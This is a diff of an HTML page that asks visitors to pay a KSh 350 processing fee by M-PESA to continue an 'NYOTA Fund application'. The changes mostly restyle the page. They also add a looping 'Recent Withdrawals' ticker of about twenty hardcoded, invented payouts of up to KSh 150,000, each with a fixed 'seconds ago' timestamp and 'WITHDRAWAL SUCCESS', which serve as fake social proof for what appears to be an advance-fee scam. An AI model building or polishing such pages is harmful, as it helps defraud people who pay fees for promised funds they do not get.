@@ -2,7 +2,6 @@
 <html lang="en">
 
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -16,9 +15,14 @@
     box-sizing:border-box;
 }
 
-body{
+html,body{
     margin:0;
-    padding:16px 10px;
+    padding:0;
+    width:100%;
+}
+
+body{
+    padding:10px;
     font-family:'Mali',sans-serif;
     background:#0B0217;
     color:#fff;
@@ -31,12 +35,12 @@ body{
 }
 
 /* =================================
-   PROCESSING FEE CARD
+   PAYMENT CARD
 ================================= */
 
-.processing-fee-card,
 .card{
     width:100%;
+
     background:
         linear-gradient(
             145deg,
@@ -44,7 +48,8 @@ body{
             rgba(255,255,255,0.035)
         );
 
-    padding:45px 30px;
+    padding:16px 16px 14px;
+
     border-radius:18px;
 
     box-shadow:
@@ -52,86 +57,65 @@ body{
         inset 0 1px 0 rgba(255,255,255,0.05);
 
     border:1px solid rgba(255,255,255,0.10);
-
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
 }
-
-/* TITLE */
 
 h1{
     text-align:center;
     color:#D4AF37;
-    font-size:22px;
+    font-size:21px;
     font-weight:700;
-    margin:0 0 12px;
+    margin:0 0 8px;
 }
-
-/* TEXT */
 
 p{
     text-align:center;
-    font-size:14px;
-    line-height:1.5;
+    font-size:12px;
+    line-height:1.35;
     color:rgba(255,255,255,0.72);
+    margin:7px 0;
 }
 
-/* PROCESSING FEE AMOUNT */
-
-.processing-fee-card .fee-amount,
 .amount{
-    width:100%;
-    box-sizing:border-box;
-
-    padding:25px 20px;
-
-    text-align:center;
-
     background:rgba(212,175,55,0.055);
-
     border:1px solid rgba(212,175,55,0.25);
 
     border-radius:12px;
 
-    font-size:20px;
+    padding:11px 10px;
+
+    font-size:18px;
     font-weight:700;
+
+    text-align:center;
 
     color:#fff;
 
-    margin:18px 0;
+    margin:10px 0;
 }
-
-/* LABEL */
 
 label{
     display:block;
 
-    margin-top:15px;
-    margin-bottom:7px;
+    margin-top:8px;
+    margin-bottom:5px;
 
-    font-size:14px;
+    font-size:12px;
     font-weight:700;
 
     color:rgba(255,255,255,0.88);
 }
 
-/* FORM INPUTS */
-
-.processing-fee-card input,
 input{
     width:100%;
-    box-sizing:border-box;
+    height:48px;
 
-    height:85px;
-
-    padding:0 20px;
+    padding:0 12px;
 
     border:1px solid rgba(255,255,255,0.12);
 
     border-radius:10px;
 
-    font-size:16px;
+    font-size:15px;
 
     font-family:'Mali',sans-serif;
 
@@ -146,30 +130,21 @@ input:focus{
     border-color:rgba(212,175,55,0.8);
 
     box-shadow:
-        0 0 0 3px
-        rgba(212,175,55,0.10);
+        0 0 0 3px rgba(212,175,55,0.10);
 }
 
 /* =================================
    PAY PROCESSING FEE BUTTON
 ================================= */
 
-.processing-fee-card button,
 button{
     width:100%;
 
-    height:88px;
-    min-height:88px;
+    height:54px;
 
-    padding:0 20px;
+    padding:0 15px;
 
-    box-sizing:border-box;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    margin:17px 0;
+    margin:12px 0;
 
     background:
         linear-gradient(
@@ -186,17 +161,21 @@ button{
 
     font-family:'Mali',sans-serif;
 
-    font-size:16px;
+    font-size:15px;
+
     font-weight:700;
 
     cursor:pointer;
 
-    box-shadow:
-        0 10px 30px
-        rgba(212,175,55,0.20),
+    display:flex;
 
-        inset 0 1px 0
-        rgba(255,255,255,0.55);
+    align-items:center;
+
+    justify-content:center;
+
+    box-shadow:
+        0 10px 30px rgba(212,175,55,0.20),
+        inset 0 1px 0 rgba(255,255,255,0.55);
 }
 
 button:hover{
@@ -214,7 +193,6 @@ button:active{
 
 button:disabled{
     background:rgba(255,255,255,0.25);
-
     color:#fff;
 
     cursor:not-allowed;
@@ -222,116 +200,173 @@ button:disabled{
     box-shadow:none;
 }
 
-/* MESSAGE */
-
 #stkMessage{
-    min-height:20px;
+    min-height:18px;
 
-    margin-top:0;
+    margin:2px 0 0;
 
     color:#D4AF37;
 
-    font-size:13px;
+    font-size:11px;
 
     font-weight:600;
 
-    line-height:1.5;
+    line-height:1.4;
 }
 
+
 /* =================================
-   EQUAL TOP / BOTTOM SPACING
+   PROCESSING FEE CARD
 ================================= */
 
-.processing-fee-card > *,
-.card > *{
+.processing-fee-card{
+    width:100%;
+
+    box-sizing:border-box;
+
+    padding:45px 30px;
+
+    display:flex;
+
+    flex-direction:column;
+
+    justify-content:center;
+}
+
+.processing-fee-card .fee-amount{
+    width:100%;
+
+    box-sizing:border-box;
+
+    padding:25px 20px;
+
+    text-align:center;
+}
+
+.processing-fee-card input{
+    width:100%;
+
+    box-sizing:border-box;
+
+    height:85px;
+
+    padding:0 20px;
+}
+
+.processing-fee-card button{
+    width:100%;
+
+    height:88px;
+
+    min-height:88px;
+
+    padding:0 20px;
+
+    box-sizing:border-box;
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:center;
+}
+
+.processing-fee-card > *{
     margin-top:12px;
+
     margin-bottom:12px;
 }
 
-.processing-fee-card > *:first-child,
-.card > *:first-child{
+.processing-fee-card > *:first-child{
     margin-top:0;
 }
 
-.processing-fee-card > *:last-child,
-.card > *:last-child{
+.processing-fee-card > *:last-child{
     margin-bottom:0;
 }
+
 
 /* =================================
    RECENT WITHDRAWALS
 ================================= */
 
 .activity-box{
-    margin-top:18px;
+
+    width:100%;
+
+    margin-top:12px;
 
     background:#1D293B;
 
-    border-radius:28px;
+    border-radius:24px;
 
-    padding:22px 12px 20px;
+    padding:16px 10px 15px;
 
     overflow:hidden;
 
     box-shadow:
-        0 20px 60px
-        rgba(0,0,0,0.45);
+        0 20px 60px rgba(0,0,0,0.45);
 }
 
 .activity-title{
+
     text-align:center;
 
-    font-size:21px;
+    font-size:18px;
 
     font-weight:700;
 
     color:#fff;
 
-    margin:2px 0 18px;
+    margin:0 0 12px;
 }
 
 .activity-title span{
-    margin-right:7px;
+    margin-right:6px;
 }
 
-/* VISIBLE SCROLLING WINDOW */
-
 .activity-window{
-    height:560px;
+
+    height:360px;
 
     overflow:hidden;
 
     position:relative;
 }
 
-/* MOVING TRACK */
-
 .activity-track{
+
     display:flex;
 
     flex-direction:column;
 
-    gap:14px;
+    gap:10px;
 
     animation:
         scrollActivity
-        35s linear infinite;
+        35s
+        linear
+        infinite;
 }
 
 .activity-window:active .activity-track{
     animation-play-state:paused;
 }
 
-/* WITHDRAWAL CARD */
+
+/* =================================
+   WITHDRAWAL CARD
+================================= */
 
 .activity-item{
-    min-height:125px;
+
+    min-height:92px;
 
     background:#020617;
 
-    border-radius:24px;
+    border-radius:19px;
 
-    border-left:7px solid #D4AF37;
+    border-left:6px solid #D4AF37;
 
     display:flex;
 
@@ -339,25 +374,25 @@ button:disabled{
 
     justify-content:space-between;
 
-    padding:18px 16px 18px 17px;
+    padding:13px 12px;
 
     flex-shrink:0;
 }
 
-/* INFORMATION */
-
 .activity-info{
+
     display:flex;
 
     flex-direction:column;
 
-    gap:6px;
+    gap:4px;
 
     min-width:0;
 }
 
 .activity-phone{
-    font-size:17px;
+
+    font-size:14px;
 
     font-weight:600;
 
@@ -365,35 +400,32 @@ button:disabled{
 }
 
 .activity-amount{
-    font-size:16px;
+
+    font-size:14px;
 
     font-weight:600;
 
-    color:#D4AF37;
+    color:#fff;
 }
 
 .activity-time{
-    font-size:12px;
+
+    font-size:11px;
 
     color:rgba(255,255,255,0.55);
 }
 
-/* STATUS */
-
 .activity-status{
-    background:
-        rgba(212,175,55,0.13);
+
+    background:rgba(212,175,55,0.15);
 
     color:#D4AF37;
 
-    border:1px solid
-        rgba(212,175,55,0.25);
-
     border-radius:40px;
 
-    padding:12px 10px;
+    padding:9px 9px;
 
-    font-size:10px;
+    font-size:9px;
 
     font-weight:700;
 
@@ -401,10 +433,13 @@ button:disabled{
 
     text-align:center;
 
-    margin-left:8px;
+    margin-left:7px;
 }
 
-/* CONTINUOUS MOVEMENT */
+
+/* =================================
+   CONTINUOUS SCROLL
+================================= */
 
 @keyframes scrollActivity{
 
@@ -418,6 +453,7 @@ button:disabled{
 
 }
 
+
 /* =================================
    MOBILE
 ================================= */
@@ -425,68 +461,86 @@ button:disabled{
 @media(max-width:360px){
 
     body{
-        padding:10px 7px;
+        padding:7px;
     }
 
-    .processing-fee-card,
     .card{
-        padding:30px 15px;
+        padding:14px 12px 12px;
+
         border-radius:15px;
     }
 
     h1{
-        font-size:20px;
-    }
-
-    .processing-fee-card input,
-    input{
-        height:70px;
-    }
-
-    .processing-fee-card button,
-    button{
-        height:78px;
-        min-height:78px;
-
-        font-size:15px;
-    }
-
-    .activity-box{
-        padding:20px 9px;
-
-        border-radius:23px;
-    }
-
-    .activity-title{
         font-size:19px;
     }
 
-    .activity-window{
-        height:500px;
-    }
-
-    .activity-item{
-        min-height:115px;
-
-        padding:16px 10px;
-
-        border-radius:20px;
-    }
-
-    .activity-phone{
-        font-size:15px;
-    }
-
-    .activity-amount{
-        font-size:14px;
-    }
-
-    .activity-time{
+    p{
         font-size:11px;
     }
 
+    .amount{
+        font-size:17px;
+
+        padding:10px;
+    }
+
+    input{
+        height:46px;
+
+        font-size:14px;
+    }
+
+    button{
+        height:52px;
+
+        font-size:14px;
+
+        margin:10px 0;
+    }
+
+    .activity-box{
+
+        margin-top:10px;
+
+        padding:14px 8px;
+
+        border-radius:21px;
+    }
+
+    .activity-title{
+        font-size:17px;
+
+        margin-bottom:10px;
+    }
+
+    .activity-window{
+        height:330px;
+    }
+
+    .activity-item{
+
+        min-height:86px;
+
+        padding:12px 9px;
+
+        border-radius:18px;
+    }
+
+    .activity-phone{
+        font-size:13px;
+    }
+
+    .activity-amount{
+        font-size:13px;
+    }
+
+    .activity-time{
+        font-size:10px;
+    }
+
     .activity-status{
-        padding:10px 7px;
+
+        padding:8px 7px;
 
         font-size:8px;
     }
@@ -497,9 +551,11 @@ button:disabled{
 
 </head>
 
+
 <body>
 
 <div class="container">
+
 
 <!-- =================================
      PAYMENT SECTION
@@ -521,6 +577,7 @@ To continue with your NYOTA Fund application, please complete the processing fee
 Processing Fee: KSh 350
 </div>
 
+
 <label>Full Name</label>
 
 <input
@@ -528,6 +585,7 @@ Processing Fee: KSh 350
     id="fullName"
     readonly
 >
+
 
 <label>M-PESA Phone Number</label>
 
@@ -537,12 +595,14 @@ Processing Fee: KSh 350
     placeholder="2547XXXXXXXX"
 >
 
+
 <button
     id="payBtn"
     onclick="payNow()"
 >
     Pay Processing Fee
 </button>
+
 
 <p id="stkMessage"></p>
 
@@ -564,7 +624,208 @@ Recent Withdrawals
 
 <div class="activity-track">
 
-<!-- 20 TRANSACTIONS -->
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0702****5</div>
+<div class="activity-amount">KSh. 150,000</div>
+<div class="activity-time">5 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0115****0</div>
+<div class="activity-amount">KSh. 110,000</div>
+<div class="activity-time">4 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0757****0</div>
+<div class="activity-amount">KSh. 85,000</div>
+<div class="activity-time">4 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0722****9</div>
+<div class="activity-amount">KSh. 75,000</div>
+<div class="activity-time">3 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0719****7</div>
+<div class="activity-amount">KSh. 65,000</div>
+<div class="activity-time">3 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0749****6</div>
+<div class="activity-amount">KSh. 50,000</div>
+<div class="activity-time">2 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0791****3</div>
+<div class="activity-amount">KSh. 40,000</div>
+<div class="activity-time">2 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0708****1</div>
+<div class="activity-amount">KSh. 30,000</div>
+<div class="activity-time">1 minute ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0728****4</div>
+<div class="activity-amount">KSh. 22,000</div>
+<div class="activity-time">59 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0712****8</div>
+<div class="activity-amount">KSh. 30,000</div>
+<div class="activity-time">52 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0798****2</div>
+<div class="activity-amount">KSh. 40,000</div>
+<div class="activity-time">45 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0705****9</div>
+<div class="activity-amount">KSh. 50,000</div>
+<div class="activity-time">38 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0740****5</div>
+<div class="activity-amount">KSh. 65,000</div>
+<div class="activity-time">31 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0725****6</div>
+<div class="activity-amount">KSh. 75,000</div>
+<div class="activity-time">24 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0710****4</div>
+<div class="activity-amount">KSh. 85,000</div>
+<div class="activity-time">18 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0786****1</div>
+<div class="activity-amount">KSh. 110,000</div>
+<div class="activity-time">12 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0701****8</div>
+<div class="activity-amount">KSh. 150,000</div>
+<div class="activity-time">8 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0733****2</div>
+<div class="activity-amount">KSh. 22,000</div>
+<div class="activity-time">5 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0772****7</div>
+<div class="activity-amount">KSh. 40,000</div>
+<div class="activity-time">3 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0750****3</div>
+<div class="activity-amount">KSh. 30,000</div>
+<div class="activity-time">2 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
+</div>
+
+
+<!-- DUPLICATE SET FOR CONTINUOUS SCROLL -->
 
 <div class="activity-item">
 <div class="activity-info">
@@ -746,187 +1007,6 @@ Recent Withdrawals
 <div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
 </div>
 
-<!-- DUPLICATE FOR CONTINUOUS SCROLL -->
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0702****5</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">5 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0115****0</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0757****0</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">4 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0722****9</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0719****7</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">3 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0749****6</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0791****3</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">2 minutes ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0708****1</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">1 minute ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0728****4</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">59 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0712****8</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">52 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0798****2</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">45 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0705****9</div>
-<div class="activity-amount">KSh. 50,000</div>
-<div class="activity-time">38 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0740****5</div>
-<div class="activity-amount">KSh. 65,000</div>
-<div class="activity-time">31 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0725****6</div>
-<div class="activity-amount">KSh. 75,000</div>
-<div class="activity-time">24 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0710****4</div>
-<div class="activity-amount">KSh. 85,000</div>
-<div class="activity-time">18 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0786****1</div>
-<div class="activity-amount">KSh. 110,000</div>
-<div class="activity-time">12 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0701****8</div>
-<div class="activity-amount">KSh. 150,000</div>
-<div class="activity-time">8 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0733****2</div>
-<div class="activity-amount">KSh. 22,000</div>
-<div class="activity-time">5 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0772****7</div>
-<div class="activity-amount">KSh. 40,000</div>
-<div class="activity-time">3 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0750****3</div>
-<div class="activity-amount">KSh. 30,000</div>
-<div class="activity-time">2 seconds ago</div>
-</div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div>
 
 </div>
 </div>
